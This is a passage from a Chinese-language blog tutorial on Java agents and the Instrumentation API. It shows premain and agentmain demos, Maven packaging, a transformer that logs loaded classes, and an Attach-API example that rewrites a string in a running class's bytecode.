class="meta">@SuppressWarnings(&quot;rawtypes&quot;)</span></span><br><span class="line">    Class[] getInitiatedClasses(ClassLoader loader);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取一个对象的大小</span></span><br><span class="line">    <span class="function"><span class="keyword">long</span> <span class="title">getObjectSize</span><span class="params">(Object objectToSize)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">appendToBootstrapClassLoaderSearch</span><span class="params">(JarFile jarfile)</span></span>;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">appendToSystemClassLoaderSearch</span><span class="params">(JarFile jarfile)</span></span>;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">isNativeMethodPrefixSupported</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setNativeMethodPrefix</span><span class="params">(ClassFileTransformer transformer, String prefix)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="3-JVM启动前静态Instrument"><a href="#3-JVM启动前静态Instrument" class="headerlink" title="3. JVM启动前静态Instrument"></a>3. JVM启动前静态Instrument</h2><h3 id="3-1-实现一个Demo"><a href="#3-1-实现一个Demo" class="headerlink" title="3.1 实现一个Demo"></a>3.1 实现一个Demo</h3><p><strong>1）创建一个类包含premain方法:</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shadowflow.learn;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.IllegalClassFormatException;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PreMainTraceAgent</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">premain</span><span class="params">(String agentArgs, Instrumentation inst)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;两个参数的java agent premain&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上面我们实现的这个类，实现了带有Instrumentation参数的premain方法。调用addTransformer()方法对启动时所有类进行拦截        </p>
<p><strong>2） 打包agent：</strong>:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&lt;build&gt;</span><br><span class="line">    &lt;plugins&gt;</span><br><span class="line">        &lt;plugin&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;maven-jar-plugin&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">3.1</span><span class="number">.0</span>&lt;/version&gt;</span><br><span class="line">            &lt;configuration&gt;</span><br><span class="line">                &lt;archive&gt;</span><br><span class="line">                    &lt;!--自动添加META-INF/MANIFEST.MF --&gt;</span><br><span class="line">                    &lt;manifest&gt;</span><br><span class="line">                        &lt;addClasspath&gt;<span class="keyword">true</span>&lt;/addClasspath&gt;</span><br><span class="line">                    &lt;/manifest&gt;</span><br><span class="line">                    &lt;manifestEntries&gt;</span><br><span class="line">                        &lt;Premain-Class&gt;com.shadowflow.learn.PreMainTraceAgent&lt;/Premain-Class&gt;</span><br><span class="line">                        &lt;Agent-Class&gt;com.shadowflow.learn.PreMainTraceAgent&lt;/Agent-Class&gt;</span><br><span class="line">                        &lt;Can-Redefine-Classes&gt;<span class="keyword">true</span>&lt;/Can-Redefine-Classes&gt;</span><br><span class="line">                        &lt;Can-Retransform-Classes&gt;<span class="keyword">true</span>&lt;/Can-Retransform-Classes&gt;</span><br><span class="line">                    &lt;/manifestEntries&gt;</span><br><span class="line">                &lt;/archive&gt;</span><br><span class="line">            &lt;/configuration&gt;</span><br><span class="line">        &lt;/plugin&gt;</span><br><span class="line">    &lt;/plugins&gt;</span><br><span class="line">&lt;/build&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>3）打包：</strong></p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">mvn</span> clean install</span><br></pre></td></tr></table></figure>

<p><strong>4）编写待插桩类：</strong></p>
<p>新建一个工程,创建两个类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shadowflow.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestMain</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;main start&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;-----&quot;</span>+<span class="keyword">new</span> Dog().say());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shadowflow.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Dog</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">say</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;I&#x27;am a dog!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>maven</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-jar-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">archive</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">manifest</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">addClasspath</span>&gt;</span>true<span class="tag">&lt;/<span class="name">addClasspath</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">mainClass</span>&gt;</span>com.shadowflow.test.TestMain<span class="tag">&lt;/<span class="name">mainClass</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">archive</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>同样打包</p>
<p><strong>5）执行：</strong></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">java</span> -javaagent:./javaagent-demo-<span class="number">1</span>.<span class="number">0</span>-SNAPSHOT.jar -jar test-<span class="number">1</span>.<span class="number">0</span>-SNAPSHOT.jar</span><br></pre></td></tr></table></figure>

<p>执行结果</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">两个参数的java agent premain</span><br><span class="line">main <span class="built_in">start</span></span><br><span class="line"><span class="comment">-----I&#x27;am a dog!</span></span><br></pre></td></tr></table></figure>



<h3 id="3-2-打印加载的类"><a href="#3-2-打印加载的类" class="headerlink" title="3.2 打印加载的类"></a>3.2 打印加载的类</h3><p>一旦你addTransformer之后，需要加载的每一个类都会经过transform方法。</p>
<p>首先添加addTransformer</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shadowflow.learn;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.IllegalClassFormatException;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PreMainTraceAgent</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">premain</span><span class="params">(String agentArgs, Instrumentation inst)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;两个参数的java agent premain&quot;</span>);</span><br><span class="line">        inst.addTransformer(<span class="keyword">new</span> DefineTransformer(), <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">DefineTransformer</span> <span class="keyword">implements</span> <span class="title">ClassFileTransformer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="keyword">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;premain load Class:&quot;</span> + className);</span><br><span class="line">            <span class="keyword">return</span> classfileBuffer;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>执行</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">java</span> -javaagent:javaagent-demo-<span class="number">1</span>.<span class="number">0</span>-SNAPSHOT.jar -jar test-<span class="number">1</span>.<span class="number">0</span>-SNAPSHOT.jar</span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">两个参数的java agent premain</span><br><span class="line">premain <span class="keyword">load</span> <span class="keyword">Class</span>:java/lang/invoke/MethodHandleImpl</span><br><span class="line">premain <span class="keyword">load</span> <span class="keyword">Class</span>:java/lang/invoke/MethodHandleImpl<span class="meta">$1</span></span><br><span class="line">premain <span class="keyword">load</span> <span class="keyword">Class</span>:java/lang/invoke/MethodHandleImpl<span class="meta">$2</span></span><br><span class="line">premain <span class="keyword">load</span> <span class="keyword">Class</span>:java/util/<span class="keyword">function</span>/<span class="keyword">Function</span></span><br><span class="line">premain <span class="keyword">load</span> <span class="keyword">Class</span>:java/lang/invoke/MethodHandleImpl<span class="meta">$3</span></span><br><span class="line">premain <span class="keyword">load</span> <span class="keyword">Class</span>:java/lang/invoke/MethodHandleImpl<span class="meta">$4</span></span><br><span class="line">premain <span class="keyword">load</span> <span class="keyword">Class</span>:java/lang/ClassValue</span><br><span class="line">premain <span class="keyword">load</span> <span class="keyword">Class</span>:java/lang/ClassValue$Entry</span><br><span class="line">premain <span class="keyword">load</span> <span class="keyword">Class</span>:java/lang/ClassValue$<span class="keyword">Identity</span></span><br><span class="line">premain <span class="keyword">load</span> <span class="keyword">Class</span>:java/lang/ClassValue$<span class="keyword">Version</span></span><br><span class="line">premain <span class="keyword">load</span> <span class="keyword">Class</span>:java/lang/invoke/MemberName$Factory</span><br><span class="line">premain <span class="keyword">load</span> <span class="keyword">Class</span>:java/lang/invoke/MethodHandleStatics</span><br><span class="line">premain <span class="keyword">load</span> <span class="keyword">Class</span>:java/lang/invoke/MethodHandleStatics<span class="meta">$1</span></span><br><span class="line">premain <span class="keyword">load</span> <span class="keyword">Class</span>:sun/misc/PostVMInitHook</span><br><span class="line">premain <span class="keyword">load</span> <span class="keyword">Class</span>:sun/misc/PostVMInitHook<span class="meta">$1</span></span><br><span class="line">premain <span class="keyword">load</span> <span class="keyword">Class</span>:sun/usagetracker/UsageTrackerClient</span><br><span class="line">premain <span class="keyword">load</span> <span class="keyword">Class</span>:java/util/concurrent/atomic/AtomicBoolean</span><br><span class="line">premain <span class="keyword">load</span> <span class="keyword">Class</span>:sun/usagetracker/UsageTrackerClient<span class="meta">$1</span></span><br><span class="line">premain <span class="keyword">load</span> <span class="keyword">Class</span>:sun/usagetracker/UsageTrackerClient<span class="meta">$4</span></span><br><span class="line">premain <span class="keyword">load</span> <span class="keyword">Class</span>:sun/usagetracker/UsageTrackerClient<span class="meta">$3</span></span><br><span class="line">premain <span class="keyword">load</span> <span class="keyword">Class</span>:java/io/FileOutputStream<span class="meta">$1</span></span><br><span class="line">premain <span class="keyword">load</span> <span class="keyword">Class</span>:sun/launcher/LauncherHelper</span><br><span class="line">premain <span class="keyword">load</span> <span class="keyword">Class</span>:java/util/jar/JarVerifier</span><br><span class="line">premain <span class="keyword">load</span> <span class="keyword">Class</span>:java/<span class="keyword">security</span>/CodeSigner</span><br><span class="line">premain <span class="keyword">load</span> <span class="keyword">Class</span>:java/util/jar/JarVerifier<span class="meta">$3</span></span><br><span class="line">premain <span class="keyword">load</span> <span class="keyword">Class</span>:java/io/ByteArrayOutputStream</span><br><span class="line">premain <span class="keyword">load</span> <span class="keyword">Class</span>:java/util/concurrent/ConcurrentHashMap$ForwardingNode</span><br><span class="line">premain <span class="keyword">load</span> <span class="keyword">Class</span>:com/shadowflow/test/TestMain</span><br><span class="line">premain <span class="keyword">load</span> <span class="keyword">Class</span>:sun/launcher/LauncherHelper$FXHelper</span><br><span class="line">premain <span class="keyword">load</span> <span class="keyword">Class</span>:java/lang/<span class="keyword">Class</span>$MethodArray</span><br><span class="line">premain <span class="keyword">load</span> <span class="keyword">Class</span>:java/lang/<span class="type">Void</span></span><br><span class="line">main <span class="keyword">start</span></span><br><span class="line">premain <span class="keyword">load</span> <span class="keyword">Class</span>:com/shadowflow/test/Dog</span><br><span class="line"><span class="comment">-----I&#x27;am a dog!</span></span><br><span class="line">premain <span class="keyword">load</span> <span class="keyword">Class</span>:java/lang/Shutdown</span><br><span class="line">premain <span class="keyword">load</span> <span class="keyword">Class</span>:java/lang/Shutdown$<span class="keyword">Lock</span></span><br></pre></td></tr></table></figure>



<h2 id="4-JVM启动后动态Instrument"><a href="#4-JVM启动后动态Instrument" class="headerlink" title="4.  JVM启动后动态Instrument"></a>4.  JVM启动后动态Instrument</h2><p>上面介绍的Instrumentation是在 JDK 1.5中提供的，开发者只能在main加载之前添加手脚，在 Java SE 6 的 Instrumentation 当中，提供了一个新的代理操作方法：agentmain，可以在 main 函数开始运行之后再运行。</p>
<p>跟<code>premain</code>函数一样， 开发者可以编写一个含有<code>agentmain</code>函数的 Java 类：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//采用attach机制，被代理的目标程序VM有可能很早之前已经启动，当然其所有类已经被加载完成，这个时候需要借助Instrumentation#retransformClasses(Class<span class="meta">&lt;?</span>&gt;... classes)让对应的类可以重新转换，从而激活重新转换的类执行ClassFileTransformer列表中的回调</span></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="keyword">void</span> agentmain (<span class="keyword">String</span> agentArgs, Instrumentation inst)</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="keyword">void</span> agentmain (<span class="keyword">String</span> agentArgs)</span><br></pre></td></tr></table></figure>

<p>在Java6 以后实现启动后加载的新实现是Attach api。Attach API 很简单，只有 2 个主要的类，都在 <code>com.sun.tools.attach</code> 包里面：</p>
<ul>
<li><p><code>VirtualMachine</code> </p>
<p>字面意义表示一个Java 虚拟机，也就是程序需要监控的目标虚拟机，提供了获取系统信息(比如获取内存dump、线程dump，类信息统计(比如已加载的类以及实例个数等)， loadAgent，Attach 和 Detach （Attach 动作的相反行为，从 JVM 上面解除一个代理）等方法，可以实现的功能可以说非常之强大 。该类允许我们通过给attach方法传入一个jvm的pid(进程id)，远程连接到jvm上 。</p>
</li>
<li><p>VirtualMachineDescriptor</p>
<p>则是一个描述虚拟机的容器类，配合 VirtualMachine 类完成各种功能。</p>
</li>
</ul>
<p>attach实现动态注入的原理如下：</p>
<p>通过VirtualMachine类的<code>attach(pid)</code>方法，便可以attach到一个运行中的java进程上，之后便可以通过<code>loadAgent(agentJarPath)</code>来将agent的jar包注入到对应的进程，然后对应的进程会调用agentmain方法。</p>
<p><img src="../images/pic/java-agent1.jpg"></p>
<p>既然是两个进程之间通信那肯定的建立起连接，VirtualMachine.attach动作类似TCP创建连接的三次握手，目的就是搭建attach通信的连接。而后面执行的操作，例如vm.loadAgent，其实就是向这个socket写入数据流，接收方target VM会针对不同的传入数据来做不同的处理。</p>
<p>我们来测试一下agentmain的使用：</p>
<h3 id="测试用例"><a href="#测试用例" class="headerlink" title="测试用例"></a>测试用例</h3><p><strong>第一步：编写被代理的类：</strong></p>
<p>我们先写一个死循环的java程序，然后然后让它运行，在运行中进行Attach</p>
<p>每隔3秒打印Nice!</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shadowflow.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sayNice</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Nice!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            sayNice();</span><br><span class="line">            Thread.sleep(<span class="number">1000</span> * <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后运行</p>
<p><strong>第二步：编写agent:</strong></p>
<p>写一个java agent，这次我们不自动生成MANIFEST.MF。在resources目录下新建MANIFEST.MF，添加如下</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">Agent-Class:</span> <span class="string">com.shadowflow.sec.AgentMain</span></span><br><span class="line"><span class="attr">Can-Redefine-Classes:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">Can-Retransform-Classes:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p>META-INF/MAINFEST.MF 参数：</p>
<figure class="highlight oxygene"><table><tr><td class="code"><pre><span class="line">Premain-<span class="keyword">Class</span>：指定包含 premain 方法的类名。</span><br><span class="line">Agent-<span class="keyword">Class</span>：指定包含 agentmain 方法的类名。</span><br><span class="line">Boot-<span class="keyword">Class</span>-Path：指定引导类加载器搜索的路径列表。查找类的特点于平台的机制失败后，引导类加载器会搜索这些路径。</span><br><span class="line">Can-Redefine-<span class="keyword">Class</span>：是否能重新定义此代理所需的类，默认为 <span class="keyword">false</span>。</span><br><span class="line">Can-Retransform-<span class="keyword">Class</span>：是否能重新转换此代理所需的类，默认为 <span class="keyword">false</span>。</span><br><span class="line">Can-<span class="keyword">Set</span>-Native-<span class="function"><span class="keyword">Method</span>-<span class="title">Prefix</span>：是否能设置此代理所需的本机方法前缀，默认值为 <span class="title">false</span>。</span></span><br></pre></td></tr></table></figure>

<p>agent类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shadowflow.sec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.IllegalClassFormatException;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.UnmodifiableClassException;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AgentMain</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">agentmain</span><span class="params">(String agentArgs, Instrumentation inst)</span> <span class="keyword">throws</span> ClassNotFoundException, UnmodifiableClassException </span>&#123;</span><br><span class="line">        inst.addTransformer(<span class="keyword">new</span> Transformer(), <span class="keyword">true</span>);</span><br><span class="line">        inst.retransformClasses(Class.forName(<span class="string">&quot;com.shadowflow.test.MyClass&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Transformer</span> <span class="keyword">implements</span> <span class="title">ClassFileTransformer</span> </span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">byte</span>[] transform(ClassLoader loader, String className,</span><br><span class="line">                                Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain,</span><br><span class="line">                                <span class="keyword">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 将常用的类名转换为 JVM 认识的类名</span></span><br><span class="line">            className = className.replace(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;.&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 如果类名为我们指定的类</span></span><br><span class="line">            <span class="keyword">if</span> (className.equals(<span class="string">&quot;com.shadowflow.test.MyClass&quot;</span>)) &#123;</span><br><span class="line">                <span class="comment">// 进一步进行处理，替换掉输出字符串</span></span><br><span class="line">                System.out.println(className + <span class="string">&quot;.....&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> ClassHandler.replaceBytes(className, classfileBuffer);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> classfileBuffer;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>依赖的ClassHandler:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shadowflow.sec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] replaceBytes(String className, <span class="keyword">byte</span>[] classBuffer) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将类字节码转换成byte字符串</span></span><br><span class="line">        String bufferStr = Arrays.toString(classBuffer);</span><br><span class="line">        System.out.println(className + <span class="string">&quot;类替换前的字节码:&quot;</span> + bufferStr);</span><br><span class="line"></span><br><span class="line">        bufferStr = bufferStr.replace(<span class="string">&quot;[&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;]&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 查找需要替换的Java二进制内容</span></span><br><span class="line">        <span class="keyword">byte</span>[] findBytes = <span class="string">&quot;Nice!&quot;</span>.getBytes();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 把搜索的字符串byte转换成byte字符串</span></span><br><span class="line">        String findStr = Arrays.toString(findBytes).replace(<span class="string">&quot;[&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;]&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 二进制替换后的byte值，注意这个值需要和替换的字符串长度一致，不然会破坏常量池</span></span><br><span class="line">        <span class="keyword">byte</span>[] replaceBytes = <span class="string">&quot;Fxxk!&quot;</span>.getBytes();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 把替换的字符串byte转换成byte字符串</span></span><br><span class="line">        String replaceStr = Arrays.toString(replaceBytes).replace(<span class="string">&quot;[&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;]&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        bufferStr = bufferStr.replace(findStr, replaceStr);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 切割替换后的byte字符串</span></span><br><span class="line">        String[] byteArray = bufferStr.split(<span class="string">&quot;\\s*,\\s*&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建新的byte数组，存储替换后的二进制</span></span><br><span class="line">        <span class="keyword">byte</span>[] bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[byteArray.length];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将byte字符串转换成byte</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; byteArray.length; i++) &#123;</span><br><span class="line">            bytes[i] = Byte.parseByte(byteArray[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(className + <span class="string">&quot;类替换后的字节码:&quot;</span> + Arrays.toString(bytes));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 返回修改后的二进制</span></span><br><span class="line">        <span class="keyword">return</span> bytes;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>pom文件</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;project xmlns=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class="line">         xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="line">         xsi:schemaLocation=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br><span class="line">    &lt;modelVersion&gt;<span class="number">4.0</span><span class="number">.0</span>&lt;/modelVersion&gt;</span><br><span class="line">    &lt;build&gt;</span><br><span class="line">        &lt;plugins&gt;</span><br><span class="line">            &lt;plugin&gt;</span><br><span class="line">                &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;</span><br><span class="line">                &lt;artifactId&gt;maven-jar-plugin&lt;/artifactId&gt;</span><br><span class="line">                &lt;version&gt;<span class="number">3.1</span><span class="number">.0</span>&lt;/version&gt;</span><br><span class="line">                &lt;configuration&gt;</span><br><span class="line">                    &lt;archive&gt;</span><br><span class="line">                            &lt;manifestFile&gt;src/main/resources/MANIFEST.MF&lt;/manifestFile&gt;</span><br><span class="line">                    &lt;/archive&gt;</span><br><span class="line">                &lt;/configuration&gt;</span><br><span class="line">            &lt;/plugin&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &lt;/plugins&gt;</span><br><span class="line">    &lt;/build&gt;</span><br><span class="line"></span><br><span class="line">    &lt;groupId&gt;com.shadowflow&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;javaagent-demo&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">1.0</span>-SNAPSHOT&lt;/version&gt;</span><br><span class="line"></span><br><span class="line">    &lt;properties&gt;</span><br><span class="line">        &lt;maven.compiler.source&gt;<span class="number">8</span>&lt;/maven.compiler.source&gt;</span><br><span class="line">        &lt;maven.compiler.target&gt;<span class="number">8</span>&lt;/maven.compiler.target&gt;</span><br><span class="line">    &lt;/properties&gt;</span><br><span class="line">    &lt;dependencies&gt;</span><br><span class="line">        &lt;!-- https:<span class="comment">//mvnrepository.com/artifact/javassist/javassist --&gt;</span></span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;javassist&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;javassist&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">3.12</span><span class="number">.1</span>.GA&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;com.sun&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;tools&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">1.8</span>&lt;/version&gt;</span><br><span class="line">            &lt;scope&gt;system&lt;/scope&gt;</span><br><span class="line">            &lt;systemPath&gt;$&#123;env.JAVA_HOME&#125;/lib/tools.jar&lt;/systemPath&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/dependencies&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span 